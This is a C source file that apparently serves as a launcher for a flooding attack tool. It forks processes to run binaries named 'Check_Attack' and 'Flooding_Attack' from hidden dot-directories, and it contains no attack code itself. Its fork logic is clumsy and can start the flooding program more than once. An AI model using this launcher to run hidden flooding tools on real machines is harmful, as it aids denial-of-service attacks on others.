#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

int main (int argc, char *argv[])
{
	pid_t pid_check, pid_flooding;

	char *argv1[2];
	char *argv2[2];

	char check_path1[50];
	char flooding_path1[50];
	char check_path2[50];
	char flooding_path2[50];

	snprintf (check_path1, 50, "%s/.etc/.module/Check_Attack", argv[1]);
	snprintf (flooding_path1, 50, "%s/.etc/.module/Flooding_Attack", argv[1]);
	snprintf (check_path2, 50, "%s/.etc_/.module/Check_Attack", argv[1]);
	snprintf (flooding_path2, 50, "%s/.etc_/.module/Flooding_Attack", argv[1]);

	if (access (check_path1, F_OK) != -1)
	{
		argv1[0] = check_path1;
		argv1[1] = NULL;

		argv2[0] = flooding_path1;
		argv2[1] = NULL;
	}	
	else
	{
		argv1[0] = check_path2;
		argv1[1] = NULL;

		argv2[0] = flooding_path2;
		argv2[1] = NULL;
	}

	pid_check = fork ();
	pid_flooding = fork ();

	if (pid_check < 0 || pid_flooding < 0)
		exit (-1);

	if (pid_check == 0)
	{
		if (pid_flooding > 0)
		{
			wait (NULL);
			execlp (argv1[0], argv1[0], argv[1], NULL);
			exit (0);
		}
		else
			exit (0);
	}

	if (pid_flooding == 0)
	{
		execlp (argv2[0], argv2[0], NULL);
		exit (0);
	}

	wait (NULL);
	wait (NULL);
}
